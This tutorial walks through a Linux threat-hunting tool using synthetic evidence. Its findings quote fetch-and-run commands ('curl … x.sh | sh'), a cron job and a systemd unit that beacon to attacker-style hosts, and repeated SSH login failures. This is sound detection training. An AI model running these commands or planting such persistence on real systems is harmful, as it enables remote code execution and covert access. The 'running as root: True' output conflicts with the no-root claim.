# Walkthrough: from a fresh clone to a successful (synthetic) hunt

This tutorial takes you from `git clone` to five guided hunting exercises using **only synthetic data**. Everything runs without root privileges and without network access (apart from installing packages once). Nothing here installs persistence, runs malware, or asks you to weaken any security control.

> **About the outputs.** Blocks labeled *Output (captured ...)* were produced by actually running the commands in this repository's synthetic setup on the development machine (Ubuntu 24.04, Python 3.13) when this document was written; long lines are cut with `…` and long outputs are trimmed to the first lines shown. Your timestamps (`Report generated`) and temporary paths will differ. Findings come from **invented training data**, not a real host.

**Contents**
1. [Prerequisites](#1-prerequisites-and-supported-environments) · 2. [Clone](#2-clone-the-repository) · 3. [Virtualenv](#3-create-and-activate-a-virtual-environment) · 4. [Install](#4-install-dependencies) · 5. [Tests](#5-run-the-test-suite) · 6. [Validate rules](#6-validate-the-detection-rules) · 7. [Demo](#7-run-the-synthetic-demo) · 8-11 [Exercises 1-4](#exercise-1--process-hunting) · 12. [Exercise 5](#exercise-5--baseline-and-correlation) · 13. [Reports](#13-review-the-json-csv-and-markdown-reports) · 14. [Concepts](#14-severity-confidence-false-positives-and-attck) · 15. [Troubleshooting](#15-troubleshooting) · 16. [Cleanup](#16-clean-up-generated-files-safely)

## 1. Prerequisites and supported environments

- Python 3.11+ (`python3 --version`), `git`, and a shell. Linux, macOS and Windows work for this synthetic walkthrough (on Windows use PowerShell/WSL and adapt the `bash`, `sed`, `cp -r` and `rm -rf` helpers; the tool itself is the same). Live collection (not used here) is Linux-only.
- About 50 MB of disk space.
- No root, no `sudo`, no network access after `pip install`.

## 2. Clone the repository

```bash
git clone <this repository>
cd threat-hunter-tool/linux-threat-hunter
```

All commands below are run from this `linux-threat-hunter` directory.

## 3. Create and activate a virtual environment

```bash
python3 -m venv .venv
source .venv/bin/activate        # Windows PowerShell: .venv\Scripts\Activate.ps1
```

Your prompt should now start with `(.venv)`. Troubleshooting: if `venv` is missing on Debian/Ubuntu, your distribution packages it separately (`python3-venv`); installing system packages needs administrator rights, so use a Python you already have if you cannot.

## 4. Install dependencies

```bash
python -m pip install --upgrade pip
python -m pip install -r requirements-dev.txt
python -m pip install -e . --no-deps
```

Check it works:

```bash
python -m linux_threat_hunter info
```

*Output (captured from a real run):*

```text
linux-threat-hunter 0.1.0
  python        : 3.13.16
  system / arch : Linux / x86_64
  distribution  : Ubuntu 24.04.5 LTS (documented support: True)
  init system   : process_api
  running as root: True
  rules         : 33 loaded from /home/user/threat-hunter-tool/linux-threat-hunter/rules (0 invalid)
  collectors    : host, process, network, persistence, auth, files
  safety        : read-only: never kills processes, edits services, changes firewall rules or remediates
```

## 5. Run the test suite

```bash
python -m pytest -q
```

Expected: every test passes (the exact count changes as tests are added); a few Linux-only tests are skipped on other systems. No root, network or real logs are used.

## 6. Validate the detection rules

```bash
python -m linux_threat_hunter rules validate
python -m linux_threat_hunter rules list --source auth
```

*Output (captured from a real run):*

```text
33 rule(s) valid, 0 problem(s)
ID             TYPE        SOURCE      SEV           CONF    NAME
LTH-AUTH-001   threshold   auth        medium        medium  Repeated failed SSH authentication
LTH-AUTH-002   sequence    auth        high          medium  Successful SSH login after repeated failures
LTH-AUTH-004   match       auth        low           low     Suspicious sudo command pattern
LTH-AUTH-005   ioc         auth        medium        medium  Authentication from an analyst-supplied suspicious IP

4 rule(s)
```

Rules are YAML files in `rules/`. They are validated against a schema (types, severities, ATT&CK IDs, regex limits) *before* anything runs, and nothing in a rule is ever executed. `rules validate` exits with code 2 if a rule is invalid.

## 7. Run the synthetic demo

Create a working directory (ignored by git) and a baseline from the **clean** synthetic host, then hunt the **incident** synthetic host.

```bash
mkdir -p work
```

```bash
python -m linux_threat_hunter doctor
```

```bash
python -m linux_threat_hunter baseline create --input examples/synthetic-baseline-evidence --output work/baseline.json
```

*Output (captured from a real run):*

```text
Baseline written to work/baseline.json: {'persistence': 8, 'files': 3, 'executables': 5, 'listeners': 3, 'privileged_users': 1}
WARNING: a baseline captures the host as it is now, including any malicious state. Review it, and expect legitimate changes after updates.
```

```bash
python -m linux_threat_hunter hunt --input examples/synthetic-evidence --iocs examples/iocs.json --baseline work/baseline.json --output work/results --show 20
```

*Output (captured from a real run):*

```text
Analyzed 63 records from auth, event, file, network, persistence, process
Rules: 33 executed, 0 skipped
Findings: critical=2, high=15, medium=22, low=3, informational=0  (total 42)
  [critical|medium] LTH-COR-002  New persistence artifact /etc/systemd/system/sys-update.service also matches an IOC
  [critical|medium] LTH-COR-002  New persistence artifact /etc/cron.d/sysupdate also matches an IOC
  [high    |medium] LTH-AUTH-002  SSH login for deploy from 198.51.100.23 after 7 failures
  [high    |medium] LTH-COR-001  Failure burst and later success linked for source 198.51.100.23
  [high    |medium] LTH-COR-003  Process pid 4242 has both a process finding and a network finding
  [high    |high  ] LTH-FILE-003  /etc/ssh/sshd_config is world-writable (mode 0666)
  [high    |medium] LTH-FILE-004  /etc/sudoers is owned by deploy
  [high    |medium] LTH-FILE-005  File /tmp/.cache/updater matches IOC 6b12bb490904488249c0409d2ed838fac75ed403699541afd7bee939297dd36f
  [high    |medium] LTH-NET-001  updater (pid 4242) connected to IOC 203.0.113.50
  [high    |medium] LTH-PERS-003  Service /etc/systemd/system/sys-update.service runs a command in a writable location
  [high    |medium] LTH-PERS-006  Persistence artifact /etc/cron.d/sysupdate matches IOC /tmp/.cache/updater
  [high    |medium] LTH-PERS-006  Persistence artifact /etc/cron.d/sysupdate matches IOC bad-update.example.test
  [high    |medium] LTH-PERS-006  Persistence artifact /etc/systemd/system/sys-update.service matches IOC /tmp/.cache/updater
  [high    |medium] LTH-PERS-007  Suspicious command pattern in cron_job /etc/cron.d/sysupdate
  [high    |medium] LTH-PERS-009  Cron job in /etc/cron.d/sysupdate runs a command in a writable location
  [high    |medium] LTH-PERS-011  /etc/ld.so.preload added
  [high    |medium] LTH-PROC-002  Process updater (pid 4242) matches IOC 6b12bb490904488249c0409d2ed838fac75ed403699541afd7bee939297dd36f
  [medium  |medium] LTH-AUTH-001  7 failed SSH logins from 198.51.100.23 within 300s
  [medium  |low   ] LTH-AUTH-003  Account deploy used sudo but is not in the baseline
  [medium  |medium] LTH-AUTH-005  Authentication event from IOC address 198.51.100.23
  ... 22 more (see results)
...
```

Read the summary line `Rules: 33 executed, 0 skipped`: because you supplied both an IOC file and a baseline, every rule could run. Without them the IOC and baseline rules are *skipped* (with the reason recorded), which is different from "ran and found nothing".

Generate the reports now (reviewed in [section 13](#13-review-the-json-csv-and-markdown-reports)):

```bash
python -m linux_threat_hunter report --input work/results --output work/reports
```

*Output (captured from a real run):*

```text
wrote work/reports/results.json
wrote work/reports/summary.md
wrote work/reports/findings.md
wrote work/reports/findings.csv
wrote work/reports/attack_coverage.md
```

Two helper commands used throughout the exercises:

- `show --input work/results --rule <RULE-ID>` prints a finding in readable form (what, why, evidence, false positives, next steps).
- `trace --input <evidence-dir> --ref <file#index>` prints the exact evidence record a finding came from (`record_ref` in the finding's evidence).

You can also run everything above in one go with `bash scripts/run-demo.sh` (it writes to `./.demo`).

## Exercise 1 — Process hunting

**Goal:** identify a suspicious synthetic execution pattern and trace the finding to its source event.

**Prerequisites:** section 7 completed (`work/results` exists).

**Step 1.** See what process-related rules fired:

```bash
python -m linux_threat_hunter show --input work/results --rule LTH-PROC-003
```

*Output (captured from a real run):*

```text
==============================================================================
Shell sh (pid 5100) has parent service nginx
  finding   : LTH-F-2b4a7f64dfb0   rule: LTH-PROC-003 v1.0.0
  severity  : medium   confidence: medium   kind: heuristic
  observed  : 2025-10-14T09:00:00Z (collection time, UTC (host timezone: UTC))
  source    : processes.json  artifact: pid 5100 (parent nginx, pid 901)
  explains  : Process sh (pid 5100, user www-data) was started by nginx (ppid 901). Command line: sh -c curl -s http://198.51.100.7/x.sh | sh.
  rationale : Network-facing services rarely spawn interactive shells. Web-shell and exploitation activity often shows up as a service process starting sh/bash.
  ATT&CK    : T1059.004 Command and Scripting Interpreter: Unix Shell (execution) https://attack.mitre.org/techniques/T1059/004/
  evidence  : {"cmdline": "sh -c curl -s http://198.51.100.7/x.sh | sh", "exe": "/usr/bin/dash", "kernel_thread": false, "name": "sh", "parent_exe": "/usr/sbin/nginx", "…
  false positives to rule out:
    - Applications that shell out by design (PHP system(), cron-like helpers, database admin scripts, backup hooks).
    - Legitimate maintenance run through a service's exec features.
  next steps:
    1. Read the shell's command line and working directory for the action it performed.
    2. Review the parent service's logs around the process start time.
    3. Check the service's content directories for recently modified scripts.
```

**What this means.** Rule `LTH-PROC-003` fires when a shell (`sh`, `bash`, ...) has a network-facing service such as nginx as its parent. Here a shell with command line `sh -c curl -s http://198.51.100.7/x.sh | sh` was started by `nginx` (process 901). That *can* be web-shell or exploitation activity; it can also be an application that shells out by design. The rule's confidence is therefore `medium`, and the finding lists the false positives to rule out first.

**Step 2.** Trace the finding to its source record, using the `record_ref` shown in the evidence (`processes.json#7`):

```bash
python -m linux_threat_hunter trace --input examples/synthetic-evidence --ref processes.json#7
```

*Output (captured from a real run):*

```text
processes.json#7
{
  "cmdline": "sh -c curl -s http://198.51.100.7/x.sh | sh",
  "exe": "/usr/bin/dash",
  "kernel_thread": false,
  "name": "sh",
  "parent_exe": "/usr/sbin/nginx",
  "parent_name": "nginx",
  "pid": 5100,
  "ppid": 901,
  "sha256": "816f6bacc7bedf94400dc17cb8c62be05101ba463b78389ab74962e698eecded",
  "start_time": "2025-10-14T08:55:00Z",
  "state": "S",
  "user": "www-data"
}
```

Notice `parent_name` and `parent_exe`: the loader enriched this record from the parent process record (pid 901) so the rule could compare names. The `cmdline` was already redacted by the collector's patterns (secrets would show as `[REDACTED]`).

**Step 3.** Look at the other execution findings, including a deliberate false positive:

```bash
python -m linux_threat_hunter show --input work/results --rule LTH-PROC-001 --limit 5 | grep -E "^(Process|  finding|  severity|  explains)"
```

*Output (captured from a real run):*

```text
Process AppRun (pid 3100) is executing from /tmp/.mount_Cursor1xyz/AppRun
  finding   : LTH-F-92f20a1eb479   rule: LTH-PROC-001 v1.0.0
  severity  : medium   confidence: medium   kind: heuristic
  explains  : Process AppRun with pid 3100, owned by alice, runs the executable /tmp/.mount_Cursor1xyz/AppRun, which is under a writable directory. Command line: /tmp/.m…
Process updater (pid 4242) is executing from /tmp/.cache/updater
  finding   : LTH-F-f6d9e38a1af7   rule: LTH-PROC-001 v1.0.0
  severity  : medium   confidence: medium   kind: heuristic
  explains  : Process updater with pid 4242, owned by root, runs the executable /tmp/.cache/updater, which is under a writable directory. Command line: /tmp/.cache/updat…
```

`AppRun` (an AppImage mounted under `/tmp/.mount_...`) is a typical benign hit. Allowlist it with a documented reason and hunt again:

```bash
cat examples/configs/allowlist-appimage.yaml
```

*Output (captured from a real run):*

```text
# Example allowlist: AppImage mounts under /tmp are expected on this (synthetic) workstation.
allowlists:
  LTH-PROC-001:
    - field: exe
      op: startswith
      value: /tmp/.mount_
```

```bash
python -m linux_threat_hunter hunt --input examples/synthetic-evidence --iocs examples/iocs.json --baseline work/baseline.json --config examples/configs/allowlist-appimage.yaml --output work/results-allow --show 0
```

*Output (captured from a real run):*

```text
Analyzed 63 records from auth, event, file, network, persistence, process
Rules: 33 executed, 0 skipped
Findings: critical=2, high=15, medium=21, low=3, informational=0  (total 41)
...
```

```bash
python -m linux_threat_hunter report --input work/results-allow --output work/reports-allow > /dev/null
grep "^| LTH-PROC-001" work/reports-allow/summary.md
```

*Output (captured from a real run):*

```text
| LTH-PROC-001 v1.0.0 | executed | 1 | 1 |  |
```

The rules table in the report shows `LTH-PROC-001 v1.0.0 | executed | 1 | 1`: one finding remains and **1 suppressed**. Suppressions are always counted, never silent.

**Verify.** Exactly one `LTH-PROC-001` finding remains, for the pid 4242 `updater` running from `/tmp/.cache/updater`:

```bash
python -m linux_threat_hunter show --input work/results-allow --rule LTH-PROC-001 | grep -E "^Process"
```

*Output (captured from a real run):*

```text
Process updater (pid 4242) is executing from /tmp/.cache/updater
```

**Common mistakes.** Running `show` on the evidence directory instead of the *results* directory (error: `results.json ... not a regular file`); forgetting `--config` after editing the allowlist.

**Cleanup.** `rm -rf work/results-allow work/reports-allow`

## Exercise 2 — Persistence hunting

**Goal:** analyze a synthetic systemd unit and a cron entry and explain each detection.

**Step 1.** The new service:

```bash
python -m linux_threat_hunter show --input work/results --rule LTH-PERS-003 | grep -E "^(Service|  finding|  severity|  explains|  ATT&CK)"
python -m linux_threat_hunter show --input work/results --rule LTH-PERS-001 | grep -E "^(systemd|  explains)"
```

*Output (captured from a real run):*

```text
Service /etc/systemd/system/sys-update.service runs a command in a writable location
  finding   : LTH-F-a603f96b6011   rule: LTH-PERS-003 v1.0.0
  severity  : high   confidence: medium   kind: heuristic
  explains  : Exec directives in /etc/systemd/system/sys-update.service reference a writable directory: /tmp/.cache/updater --connect 203.0.113.50:4444 --token [REDACTED]
  ATT&CK    : T1543.002 Create or Modify System Process: Systemd Service (persistence) https://attack.mitre.org/techniques/T1543/002/
systemd unit added since baseline: /etc/systemd/system/sys-update.service
  explains  : The systemd_service /etc/systemd/system/sys-update.service was added relative to the baseline (changed fields: none). Referenced executable: /tmp/.cache/up…
```

**Step 2.** Read the artifact itself (the collector stores a bounded copy of the unit text and redacts secrets such as `--token` values, and `show`/`trace` redact again on display; the unit was **never executed**):

```bash
python -m linux_threat_hunter trace --input examples/synthetic-evidence --ref persistence.json#3 | head -12
```

*Output (captured from a real run):*

```text
persistence.json#3
{
  "commands": [
    "/tmp/.cache/updater --connect 203.0.113.50:4444 --token [REDACTED]"
  ],
  "commands_text": "/tmp/.cache/updater --connect 203.0.113.50:4444 --token [REDACTED]",
  "content": "[Unit]\nDescription=System Update Helper (SYNTHETIC EXAMPLE)\n\n[Service]\nExecStart=/tmp/.cache/updater …
  "exec_exists": true,
  "exec_path": "/tmp/.cache/updater",
  "fields": {
    "Description": [
      "System Update Helper (SYNTHETIC EXAMPLE)"
```

**Explanation.**
- `LTH-PERS-001` is a *baseline* rule: `sys-update.service` is **not in the clean baseline**, so it is reported as added. That is an *observation*; a package install would look the same.
- `LTH-PERS-003` is a *heuristic*: the `ExecStart` references `/tmp/.cache/updater`, a writable location. Services run at boot, so a binary in `/tmp` is unusual.
- Both map to ATT&CK `T1543.002` (Create or Modify System Process: Systemd Service). The mapping says the behavior is *related* to that technique; it does not prove an adversary created it.

**Step 3.** The cron entry and the "missing executable" finding:

```bash
python -m linux_threat_hunter show --input work/results --rule LTH-PERS-009 | grep -E "^(Cron|  explains)"
python -m linux_threat_hunter show --input work/results --rule LTH-PERS-007 | grep -E "^(Suspicious|  explains)"
python -m linux_threat_hunter show --input work/results --rule LTH-PERS-002 | grep -E "^(systemd|  explains|  severity)"
```

*Output (captured from a real run):*

```text
Cron job in /etc/cron.d/sysupdate runs a command in a writable location
  explains  : Line 2 of /etc/cron.d/sysupdate (schedule */5 * * * *, user root) runs: /tmp/.cache/updater --beacon
Suspicious command pattern in cron_job /etc/cron.d/sysupdate
  explains  : Commands in /etc/cron.d/sysupdate match a suspicious pattern: curl -s http://bad-update.example.test/x.sh | sh
systemd_service references missing executable /opt/legacy/sync.sh
  severity  : low   confidence: medium   kind: observation
  explains  : /etc/systemd/system/legacy-sync.service references /opt/legacy/sync.sh, which did not exist when the evidence was collected.
```

`LTH-PERS-002` flags `legacy-sync.service` (it points at `/opt/legacy/sync.sh`, which does not exist). It is `low` severity because dangling units are usually leftovers from removed software; it is still worth a look. Note it is present in *both* the baseline and the incident evidence, so it is **not** reported as a baseline change.

**Verify.** Cron lines were parsed into per-job records, so you can read exactly which line fired:

```bash
python -m linux_threat_hunter trace --input examples/synthetic-evidence --ref persistence.json#7 | grep -E '"(kind|command|schedule|line_no)"'
```

*Output (captured from a real run):*

```text
  "kind": "cron_file",
  "command": "/tmp/.cache/updater --beacon",
  "kind": "cron_job",
  "line_no": 2,
  "schedule": "*/5 * * * *"
  "command": "curl -s http://bad-update.example.test/x.sh | sh",
  "kind": "cron_job",
  "line_no": 3,
  "schedule": "@reboot"
```

**Common mistakes.** Expecting the tool to run the cron command to "see what it does" (it never executes discovered content); reading `exec_exists: false` as "malicious" (it only means the path did not exist at collection time).

**Cleanup.** Nothing to remove beyond `work/` (see section 16).

## Exercise 3 — Authentication hunting

**Goal:** analyze synthetic authentication logs and evaluate a configurable failed-login threshold.

**Step 1.** Read the raw synthetic log lines the finding is based on:

```bash
sed -n '13,22p' examples/synthetic-evidence/auth.log
```

*Output (captured from a real run):*

```text
Oct 14 03:11:02 lab-host-01 sshd[1400]: Invalid user admin from 198.51.100.23 port 41001
Oct 14 03:11:02 lab-host-01 sshd[1400]: Failed password for invalid user admin from 198.51.100.23 port 41001 ssh2
Oct 14 03:11:09 lab-host-01 sshd[1401]: Failed password for root from 198.51.100.23 port 41002 ssh2
Oct 14 03:11:15 lab-host-01 sshd[1402]: Failed password for root from 198.51.100.23 port 41003 ssh2
Oct 14 03:11:21 lab-host-01 sshd[1403]: Invalid user test from 198.51.100.23 port 41004
Oct 14 03:11:21 lab-host-01 sshd[1403]: Failed password for invalid user test from 198.51.100.23 port 41004 ssh2
Oct 14 03:11:30 lab-host-01 sshd[1404]: Failed password for deploy from 198.51.100.23 port 41005 ssh2
Oct 14 03:11:38 lab-host-01 sshd[1405]: Failed password for deploy from 198.51.100.23 port 41006 ssh2
Oct 14 03:11:46 lab-host-01 sshd[1406]: Failed password for deploy from 198.51.100.23 port 41007 ssh2
Oct 14 03:12:40 lab-host-01 sshd[1410]: Accepted password for deploy from 198.51.100.23 port 41010 ssh2
```

**Step 2.** The default rule (5 failures within 300 seconds, per source address):

```bash
python -m linux_threat_hunter show --input work/results --rule LTH-AUTH-001 | grep -E "^(7|  explains|  severity)"
python -m linux_threat_hunter show --input work/results --rule LTH-AUTH-002 | grep -E "^(SSH|  explains)"
python -m linux_threat_hunter show --input work/results --rule LTH-COR-001 | grep -E "^(Failure|  explains)"
```

*Output (captured from a real run):*

```text
7 failed SSH logins from 198.51.100.23 within 300s
  severity  : medium   confidence: medium   kind: heuristic
  explains  : 7 failed SSH authentication events from 198.51.100.23 between 2025-10-14T03:11:02Z and 2025-10-14T03:11:46Z targeted 4 account(s): admin, deploy, root, test. Threshold: 5.
SSH login for deploy from 198.51.100.23 after 7 failures
  explains  : An accepted SSH login for deploy from 198.51.100.23 followed 7 failed attempts (users tried: admin, deploy, root, test) within 900s, starting 2025-10-14T03:11:02Z.
Failure burst and later success linked for source 198.51.100.23
  explains  : Findings from LTH-AUTH-001 and LTH-AUTH-002 share source address 198.51.100.23 within the correlation window.
```

**Explanation.** Seven `Failed password` events from `198.51.100.23` landed in 44 seconds (the two `Invalid user` lines are not double counted). Then `deploy` logged in from the same address. `LTH-AUTH-002` reports *success after repeated failures*; `LTH-COR-001` links the two findings because they share the source IP and fall within the 1800-second correlation window. **This does not prove the account was compromised**: a user who mistypes a password repeatedly looks similar. The investigation steps tell you to confirm with the account owner and check what the session did.

Two other sources are intentionally *not* reported at the defaults:
- `203.0.113.99` failed six times, but spread over ten hours (a slow scanner), never 5 within 300 s.
- `192.0.2.77` failed three times and then `alice` logged in: below the threshold of 5.

**Step 3.** Evaluate a lower threshold. The example config sets the count to 3 for both rules:

```bash
cat examples/configs/auth-threshold-3.yaml
```

*Output (captured from a real run):*

```text
# Lower the failed-login threshold to 3 (used in walkthrough exercise 3).
rule_overrides:
  LTH-AUTH-001:
    params:
      count: 3
  LTH-AUTH-002:
    params:
      count: 3
```

```bash
python -m linux_threat_hunter hunt --input examples/synthetic-evidence --config examples/configs/auth-threshold-3.yaml --output work/results-t3 --show 0
python -m linux_threat_hunter show --input work/results-t3 --rule LTH-AUTH-001 | grep -E "^[0-9]"
python -m linux_threat_hunter show --input work/results-t3 --rule LTH-AUTH-002 | grep -E "^SSH"
```

*Output (captured from a real run):*

```text
Analyzed 63 records from auth, event, file, network, persistence, process
Rules: 18 executed, 15 skipped
Findings: critical=0, high=10, medium=10, low=3, informational=0  (total 23)
  ... 23 more (see results)
Results written to work/results-t3/results.json
Next: python -m linux_threat_hunter report --input work/results-t3 --output ./reports
3 failed SSH logins from 192.0.2.77 within 300s
7 failed SSH logins from 198.51.100.23 within 300s
SSH login for deploy from 198.51.100.23 after 7 failures
SSH login for alice from 192.0.2.77 after 3 failures
```

**What changed.** With the threshold at 3, `192.0.2.77` now appears: a legitimate user mistyping a password twice would look the same, which is exactly the trade-off the threshold controls. Choose thresholds from your own environment's normal noise (scanners, NAT gateways, automation with expired credentials).

**Verify.** Default run: 1 `LTH-AUTH-001` finding; threshold-3 run: 2.

```bash
python -m linux_threat_hunter show --input work/results --rule LTH-AUTH-001 | grep -c "  finding   :"
python -m linux_threat_hunter show --input work/results-t3 --rule LTH-AUTH-001 | grep -c "  finding   :"
```

*Output (captured from a real run):*

```text
1
2
```

**Common mistakes.** Editing a rule's `params` and forgetting that a config `rule_overrides` entry takes precedence; counting `Invalid user` lines as failures (they are not).

**Cleanup.** `rm -rf work/results-t3`

## Exercise 4 — IOC hunting

**Goal:** match a synthetic hash and IP, and inspect the evidence behind each match.

**Step 1.** The synthetic IOC file (invented indicators; nothing is downloaded):

```bash
head -22 examples/iocs.json
```

*Output (captured from a real run):*

```text
{
  "schema_version": 1,
  "description": "SYNTHETIC indicators for training only. No real threat intelligence.",
  "options": {
    "match_subdomains": false
  },
  "indicators": {
    "sha256": [
      {
        "value": "6b12bb490904488249c0409d2ed838fac75ed403699541afd7bee939297dd36f",
        "description": "Synthetic 'updater' sample",
        "severity": "high",
        "references": [
          "https://example.test/synthetic/ioc-1"
        ]
      }
    ],
    "process_names": [],
    "file_paths": [
      {
        "value": "/tmp/.cache/updater",
        "description": "Synthetic staging path",
```

**Step 2.** The IOC findings for the network socket and the process:

```bash
python -m linux_threat_hunter show --input work/results --rule LTH-NET-001 | grep -E "^(updater|  finding|  severity|  source|  explains|  IOC)"
python -m linux_threat_hunter show --input work/results --rule LTH-PROC-002 | grep -E "^(Process|  IOC)"
```

*Output (captured from a real run):*

```text
updater (pid 4242) connected to IOC 203.0.113.50
  finding   : LTH-F-9c7695ee810b   rule: LTH-NET-001 v1.0.0
  severity  : high   confidence: medium   kind: ioc_match
  source    : network.json  artifact: tcp 10.0.0.5:51234 -> 203.0.113.50:4444 (pid 4242)
  explains  : A tcp socket 10.0.0.5:51234 to 203.0.113.50:4444 (process updater, pid 4242) matched the ip indicator 203.0.113.50.
  IOC match : ip 203.0.113.50 (field remote_addr, exact)
  IOC match : file_path /tmp/.cache/updater (field process_exe, exact)
  IOC match : sha256 6b12bb490904488249c0409d2ed838fac75ed403699541afd7bee939297dd36f (field process_sha256, exact)
Process updater (pid 4242) matches IOC 6b12bb490904488249c0409d2ed838fac75ed403699541afd7bee939297dd36f
  IOC match : sha256 6b12bb490904488249c0409d2ed838fac75ed403699541afd7bee939297dd36f (field sha256, exact)
  IOC match : file_path /tmp/.cache/updater (field exe, exact)
```

**Step 3.** Trace the socket back to its source record (`network.json#3`):

```bash
python -m linux_threat_hunter trace --input examples/synthetic-evidence --ref network.json#3
```

*Output (captured from a real run):*

```text
network.json#3
{
  "listening": false,
  "local_addr": "10.0.0.5",
  "local_port": 51234,
  "pid": 4242,
  "process": "updater",
  "process_exe": "/tmp/.cache/updater",
  "process_sha256": "6b12bb490904488249c0409d2ed838fac75ed403699541afd7bee939297dd36f",
  "process_user": "root",
  "proto": "tcp",
  "remote_addr": "203.0.113.50",
  "remote_port": 4444,
  "state": "ESTAB"
}
```

**Explanation.** Every IOC finding states the *indicator*, the *matched field*, the *observed value* and the *source artifact*. Matching is exact: the SHA-256 equals the listed hash, and the remote address equals the listed IP. An IOC match is a lead, not a verdict: lists go stale, shared infrastructure can appear in IOC lists, and the severity here comes from the IOC file's own `severity` value.

**Step 4 (exact matching).** Make your own IOC file with near-misses and confirm nothing matches:

```bash
cat > work/near-miss-iocs.json <<'JSON'
{
  "schema_version": 1,
  "indicators": {
    "ips": ["203.0.113.5"],
    "domains": ["update.example.test"],
    "sha256": ["6b12bb490904488249c0409d2ed838fac75ed403699541afd7bee939297dd36e"]
  }
}
JSON
python -m linux_threat_hunter hunt --input examples/synthetic-evidence --iocs work/near-miss-iocs.json --output work/results-near --show 0
python -m linux_threat_hunter show --input work/results-near --rule LTH-NET-001
```

*Output (captured from a real run):*

```text
Analyzed 63 records from auth, event, file, network, persistence, process
Rules: 23 executed, 10 skipped
Findings: critical=0, high=8, medium=9, low=3, informational=0  (total 20)
  ... 20 more (see results)
Results written to work/results-near/results.json
Next: python -m linux_threat_hunter report --input work/results-near --output ./reports
error: no findings match the given filters
```

`203.0.113.5` is not `203.0.113.50`, the hash differs in its last digit, and `update.example.test` is not the domain used in the cron entry. No IOC finding is produced (`show` exits with an error because nothing matches). Broader (subdomain) domain matching exists but must be enabled explicitly with `"options": {"match_subdomains": true}`.

**Common mistakes.** Using `process_names` for generic names like `bash` (matches are by name only, so prefer hashes); expecting domains to match network sockets when the evidence recorded only IP addresses.

**Cleanup.** `rm -rf work/results-near work/near-miss-iocs.json`

## Exercise 5 — Baseline and correlation

**Goal:** modify a synthetic baseline observation, identify the change, and correlate related findings.

**Part A: detect a changed observation.** Copy the clean evidence and change one hash (as if `/etc/sudoers` changed):

```bash
cp -r examples/synthetic-baseline-evidence work/ex5-evidence
python - <<'PY'
import json, pathlib
p = pathlib.Path("work/ex5-evidence/files.json")
data = json.loads(p.read_text())
for rec in data:
    if rec["path"] == "/etc/sudoers":
        rec["sha256"] = "0" * 63 + "1"      # synthetic "modified" hash
p.write_text(json.dumps(data, indent=2))
PY
python -m linux_threat_hunter baseline compare --input work/ex5-evidence --baseline work/baseline.json
```

*Output (captured from a real run):*

```text
Compared categories: persistence, files, executables, listeners, privileged_users
Changes: added=0 removed=0 modified=1
  modified  files             /etc/sudoers fields=sha256
```

Exactly one change: `/etc/sudoers` modified, field `sha256`. Now see how the rule reports it:

```bash
python -m linux_threat_hunter hunt --input work/ex5-evidence --baseline work/baseline.json --output work/ex5-results --show 5
python -m linux_threat_hunter show --input work/ex5-results --rule LTH-FILE-001 | grep -E "^(Security|  severity|  explains)"
```

*Output (captured from a real run):*

```text
Analyzed 24 records from auth, file, network, persistence, process
Rules: 27 executed, 6 skipped
Findings: critical=0, high=0, medium=1, low=1, informational=0  (total 2)
  [medium  |medium] LTH-FILE-001  Security-relevant file modified since baseline: /etc/sudoers
  [low     |medium] LTH-PERS-002  systemd_service references missing executable /opt/legacy/sync.sh
Results written to work/ex5-results/results.json
Next: python -m linux_threat_hunter report --input work/ex5-results --output ./reports
Security-relevant file modified since baseline: /etc/sudoers
  severity  : medium   confidence: medium   kind: observation
  explains  : /etc/sudoers differs from the baseline (changed fields: sha256).
```

**Does it need investigation?** It is a *difference*, not intent. Routine package updates and administrator edits change `sudoers` too. Check change records, compare with the previous file from backup or configuration management, and look at who was logged in around the modification time. If it was legitimate and you accept it, update the baseline **explicitly**:

```bash
python -m linux_threat_hunter baseline update --input work/ex5-evidence --baseline work/baseline.json
```

*Output (captured from a real run):*

```text
REVIEW the changes below before accepting them as the new normal:
Compared categories: persistence, files, executables, listeners, privileged_users
Changes: added=0 removed=0 modified=1
  modified  files             /etc/sudoers fields=sha256

No changes were written. Re-run with --approve to replace the baseline (the old file is kept as <name>.bak).
```

Without `--approve` the command only shows the review and writes nothing. Re-running with `--approve` replaces the baseline and keeps the old one as `work/baseline.json.bak`. A baseline never updates silently, and remember that a baseline made from a compromised host records the compromise as "normal".

**Part B: correlation.** Back on the incident evidence, look at the correlation findings:

```bash
python -m linux_threat_hunter show --input work/results --rule LTH-COR-002 | grep -E "^(New|  severity|  explains|  related)"
python -m linux_threat_hunter show --input work/results --rule LTH-COR-003 | grep -E "^(Process|  severity|  explains|  related)"
```

*Output (captured from a real run):*

```text
New persistence artifact /etc/systemd/system/sys-update.service also matches an IOC
  severity  : critical   confidence: medium   kind: correlation
  explains  : LTH-PERS-001 and LTH-PERS-006 both reference /etc/systemd/system/sys-update.service: the artifact is new or changed relative to the baseline and matches an indicator.
  related   : LTH-F-4b59a4d042a8, LTH-F-ebfa1376163d
New persistence artifact /etc/cron.d/sysupdate also matches an IOC
  severity  : critical   confidence: medium   kind: correlation
  explains  : LTH-PERS-004 and LTH-PERS-006 both reference /etc/cron.d/sysupdate: the artifact is new or changed relative to the baseline and matches an indicator.
  related   : LTH-F-ab675424ee06, LTH-F-070a350f81af, LTH-F-1b2ab46c8abf
Process pid 4242 has both a process finding and a network finding
  severity  : high   confidence: medium   kind: correlation
  explains  : LTH-PROC-001, LTH-PROC-002 and LTH-NET-001, LTH-NET-003 both refer to pid 4242 in this snapshot.
  related   : LTH-F-f6d9e38a1af7, LTH-F-56c3a9f63687, LTH-F-9c7695ee810b, LTH-F-a084a272272a
```

**Explanation.** Correlation rules link findings only when they share an identifier:
- `LTH-COR-002` joins `LTH-PERS-001` (new unit/cron file vs. baseline) and `LTH-PERS-006` (IOC match) on the artifact **path**, because both describe `/etc/systemd/system/sys-update.service` (and again for `/etc/cron.d/sysupdate`).
- `LTH-COR-003` joins process findings and network findings on **pid 4242**, valid because both come from the same collection snapshot.
- `LTH-COR-001` (exercise 3) also requires event timestamps on both sides and a time window.

Correlated findings are higher priority leads; they are still not proof. Each correlation lists the finding IDs it links (`related`), so you can open every contributing finding with `show --id <finding-id>`.

**Verify.** The linked finding IDs resolve:

```bash
python -m linux_threat_hunter show --input work/results --rule LTH-COR-003 | grep "  related" | wc -l
```

*Output (captured from a real run):*

```text
1
```

**Cleanup.** `rm -rf work/ex5-evidence work/ex5-results`

## 13. Review the JSON, CSV and Markdown reports

```bash
ls work/reports
head -30 work/reports/summary.md | cut -c1-160
```

*Output (captured from a real run):*

```text
attack_coverage.md
findings.csv
findings.md
results.json
summary.md
